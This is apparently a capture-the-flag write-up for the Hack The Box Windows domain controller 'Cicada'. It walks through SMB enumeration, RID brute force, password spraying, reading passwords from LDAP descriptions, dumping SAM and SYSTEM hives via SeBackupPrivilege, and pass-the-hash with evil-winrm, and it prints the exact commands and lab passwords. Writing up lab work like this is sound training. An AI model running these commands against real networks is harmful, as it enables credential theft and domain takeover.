
<h2>1. High Level Summary of Box</h2> 

<b>Machine Name</b>: Cicada
<b>IP Address</b>: 10.129.231.149
<b>Domain</b>: cicada.htb0
 <b>Level of Access:</b> System/Root


<h2>2. Information Gathering & Enumeration</h2>
<h3>2.1 Service Scanning (nmap)</h3>
A TCP port scan was performed to identify open services and the machine's role.

- Command: nmap 10.129.231.149 -sV -sS -Pn
- Findings: Port 389 (LDAP) identified the domain as cicada.htb0 and confirmed the target is a Domain Controller.

![](data:image/png;base64,)

*Explanation:

- Port 389/tcp is the standard port for LDAP (Lightweight Directory Access Protocol).
- LDAP is the protocol Active Directory uses to expose its directory services — users, groups, computers, and domain information.
- Observing LDAP tied to Microsoft Windows Active Directory means the host is serving as part of the AD infrastructure.

<h3>2.2 Active Directory Enumeration</h3>
<h4>2.2.1 Obtaining the Password</h4>
Initial LDAP, rpcclient, and SMB enumeration attempts yielded the following:

- rpcclient: Null session failed with NT_STATUS_ACCESS_DENIED when attempting to list domain users and groups.
- ldapsearch: Returned an Operations error indicating that a successful bind is required before directory queries can be performed.
- smbclient: Listed default administrative shares (ADMIN$, C$, IPC$, NETLOGON, SYSVOL) and custom shares (DEV, HR), but failed to enumerate the workgroup due to SMB1 connection issues.

For now, rpcclient and ldapsearch cannot be used for more enumeration, but smbclient can be used. Using anonymous login, a temporary shell was created and from there I was able to download and read a file named Notice from HR.txt (which was located in the HR Disk).

From the file, the default password was obtained - Cicada$M6Corpb*@Lp#nZp!8

Note: For older machines, smbclient requires the --option='client min protocol=NT1' flag. An alternative would be to use NetExec directly.

![](data:image/png;base64,)

![](data:image/png;base64,)

![](data:image/png;base64,)

<h4>2.2.2 Obtaining the Usernames (RID Enumeration) </h4>
Using NetExec, I performed an RID Brute Force with the command nxc smb <Target_IP> -u 'anonymous' -p '' --rid-brute

Which gave me a list of users right at the end. The list of interest would be those who have the 'SidTypeUser' at the end.

![697](data:image/png;base64,)

Excluding Guest and Administrator, I saved the rest of the SidTypeUser into a file titled cicada_users.txt while inside the Desktop folder;  From there, I ran the NetExec command again and carried out a password spray - nxc smb 10.129.231.149 -u Desktop/cicada_users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success

Results showed that the user 'michael.wrightson' was still using the default password.

![](data:image/png;base64,)

<h2>3. Exploitation (Initial Access)</h2>
Using the newly obtained credentials, I ran the command ldapsearch -H ldap://10.129.231.149 -x -D "michael.wrightson@cicada.htb" -w 'Cicada$M6Corpb*@Lp#nZp!8' -b "DC=cicada,DC=htb" "(objectClass=user)" description ;

This allowed me to view any "temporary" password (or password hints) in the users' profile notes left behind by the administrators. It yielded a result under David Orelious' profile - "Just in case I forget my password is aRt$Lp#7t*VQ!3".

![](data:image/png;base64,)

With a new set of credentials, I ran the following two commands:

1. nxc winrm 10.129.231.149 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --> Goal: Obtain instant shell access (failed)
2. nxc smb 10.129.231.149 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --shares --> Goal: Identification of New Data (Lateral Expansion) (success)

While the user David does not have permission to login remotely and create a shell, they have READ access to the DEV share, unlike Michael who only saw it but could not interact with it.

![](data:image/png;base64,)

<h3>3.1 Lateral Movement</h3>
Using impacket-smbclient, I performed an Authenticated File System Enumeration by running the following commands in sequence, which eventually yielded a text file called Backup_script.ps1:

1. impacket-smbclient cicada.htb/david.orelious:'aRt$Lp#7t*VQ!3'@10.129.231.149 --> establishes the Authenticated Session
2. use DEV --> Mounting the Share
3. recurse --> Enables deep search
4. ls --> lists the contents

![](data:image/png;base64,)

Next, I used get to download the file into my attack machine, and cat it to read the contents within.

![](data:image/png;base64,)

![](data:image/png;base64,)

I have now obtained another set of credentials, which belongs to a user called emily.oscars. Her password is displayed as Q!3@Lp#M6b*7t*Vt in plaintext form.

I repeated the same commands of nxc smb… and nxc winrm… using emily's credentials:

1. nxc smb 10.129.231.149 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt' --shares --> Goal: Identification of New Data (Lateral Expansion) (failed)
2. nxc winrm 10.129.231.149 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt' --> Goal: Obtain instant shell access (Success! The 'Pwn3d!' string indicates that the user has Administrative rights)

![](data:image/png;base64,)

From here on, I can use the evil-winrm tool to create a shell using emily's credentials:

![](data:image/png;base64,)

To obtain the user flag, I navigated the system with ls and found the file user.txt inside the Desktop folder. The command type was then used to read the contents:

<h2>4. Privilege Escalation</h2>

A clue was given in the machine description - SeBackupPrivilege. Thus I checked my current user's status to ensure the privilege was available to them using the command whoami /priv ; and it was revealed that they do have the SeBackupPrivilege enabled.

![](data:image/png;base64,)

Thereafter, I created a temporary folder in the C:\ drive called temp to download the sam and system data into:

SAM: Contains the NTLM hashes for local users (including the Administrator).

SYSTEM: Contains the "boot key" required to decrypt the SAM hive. Without the SYSTEM hive, the SAM file is useless.

Since the system is live, you cannot simply copy the password database (NTDS.dit or SAM) because the OS locks them. However, the Registry contains a copy of the local account hashes. So to save the two files of interest, I ran the following commands and also listed the files within C:\temp afterwards to ensure the files have been saved.

reg save hklm\sam C:\Temp\sam

reg save hklm\system C:\Temp\system

![](data:image/png;base64,)

![](data:image/png;base64,)

I then moved these binary files from the target machine to my Kali machine for offline analysis by running 'download sam' and 'download system'.

Once the files were downloaded, I used a tool to extract the plaintext-equivalent hashes:

Command: impacket-secretsdump -sam sam -system system LOCAL

![](data:image/png;base64,)

![](data:image/png;base64,)

Because Windows uses NTLM hashes for authentication, I do not need to "crack" the password to get a shell, and can immediately login using evil-winrm and obtain a root shell -

![](data:image/png;base64,)

<h2>5. Post Exploitation</h2>
From there, using cd and ls, I found the root.txt file within the Desktop, and ran type to read its contents -

![](data:image/png;base64,)
